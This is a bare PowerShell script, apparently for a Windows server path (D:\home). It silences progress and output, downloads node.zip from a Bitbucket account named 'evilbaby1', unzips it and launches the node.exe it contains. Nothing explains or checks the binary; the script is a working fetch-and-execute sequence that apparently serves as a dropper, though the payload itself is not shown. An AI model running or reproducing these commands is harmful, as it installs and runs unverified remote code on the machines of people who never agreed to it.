[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls"
$ProgressPreference = "SilentlyContinue"
$null | Invoke-WebRequest -UseBasicParsing -Uri "https://bitbucket.org/evilbaby1/openai/downloads/node.zip" -OutFile "D:\home\node.zip" > $null
unzip node.zip
Start-Process -FilePath "d:\home\node.exe" 
